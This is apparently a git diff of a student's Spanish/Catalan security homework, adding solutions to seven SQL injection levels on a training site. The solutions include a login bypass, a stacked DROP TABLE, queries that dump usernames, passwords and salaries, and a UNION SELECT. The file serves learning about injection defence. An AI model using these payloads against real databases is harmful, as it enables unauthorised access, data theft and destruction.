@@ -9,11 +9,57 @@ Nota: Incluso cuando se parametrizan, los procedimientos almacenados pueden intr
 
 Tambien se pueden utilizar las conocidas "White List" para implementar validaciones de entrada, aun que por desgracia esto no es completamente seguroo debido a que muchas aplicaciones requieren el uso de caracteres especiales, como en campos de texto o APIs para aplicaciones móviles.
 
-Para evitar que 
+Para evitar que una fuga masiva de datos se puede utilizar "Limit" y consultas SQL.
+
+Daños a causa de esta vulnerabilidad: 
   
 2. Obre el següent enllaç (sql inseckten) i realitza un mínim de 7 nivells fent servir tècniques d’injecció SQL. 
 
 a. Copia cada una de les sentències SQL resultant que has realitzat a cada nivell i comenta que has aconseguit.
+Tutorial:
+SELECT username 
+FROM users 
+WHERE username ='jane' AND password ='0e274e1d1a8948f16f0227e4ec1965a8';
+Ej 1
+SELECT username 
+FROM users 
+WHERE username ='jane'--' AND password ='d41d8cd98f00b204e9800998ecf8427e';
+Entrar con un usuario y sin contraseña, comentando todo lo posterior al nombre
+Ej 2
+SELECT username 
+FROM users 
+WHERE username ='';DROP TABLE users;--' AND password ='d41d8cd98f00b204e9800998ecf8427e';
+He conseguido eliminar la tabla users, terminando la sentencia esperada por el codigo y escribiendo la sentencia necesaria para borrar dicha tabla
+Ej 3
+SELECT username 
+FROM users 
+WHERE username =''; SELECT username FROM users --' AND password ='d41d8cd98f00b204e9800998ecf8427e';
+He conseguido  todos los nombres, terminando la sentencia y escribiendo una nueva
+Ej 4
+SELECT username 
+FROM users 
+WHERE username =''; SELECT username FROM users limit 1--' AND password ='d41d8cd98f00b204e9800998ecf8427e';
+He conseguido un nombre, terminando la sentencia y despues escribiendo la sentencia necesaria limitando las respuestas a una
+Ej 5
+SELECT product_id, brand, size, price 
+FROM shoes 
+WHERE brand='Nicke';
+He conseguido que me muestre los productos de la marca nike
+
+SELECT product_id, brand, size, price 
+FROM shoes 
+WHERE brand=''; SELECT username, password FROM users --';
+He conseguido los nombres y las contraseñas, terminando las sentencia y escribiendo lo que necesitaba recordando los ejercicios anteriores
+Ej 6
+SELECT username 
+FROM users 
+WHERE username =''; SELECT salary AS username FROM staff WHERE firstname = 'Greta Maria'--' AND password ='d41d8cd98f00b204e9800998ecf8427e';
+He conseguido la cifra de cuanto cobra Greta Maria, termionando la sentencia y creando otra haciendo que el salario lo interprete como el usuario y luego solo poner la restriccion
+Ej 7
+SELECT product_id, brand, size, price 
+FROM shoes 
+WHERE brand=''UNION SELECT staff_id, name, firstname, email, salary, employed_since FROM staff--';
+He conseguido todos los campos mencionados, con ayuda de la pista que te da la web, la unica complicacion era mi desconocimineto del 'UNION' una vez resueto todo lo demás es facil
 
 b. Enumera i raona diferents formes que pot evitar un atac per SQL injection en projectes fets amb Razor Pages i Entity Framework. 
 
@@ -40,4 +86,5 @@ c. Encriptació i desencriptació amb RSA. L’usuari entrarà un text per conso
 
 Per realitzar aquest exercici utilitza la llibreria System.Security.Cryptography.
 
-6.  Indica les referències que has consultat, seguint el següent format:
+6.  Referències:
+
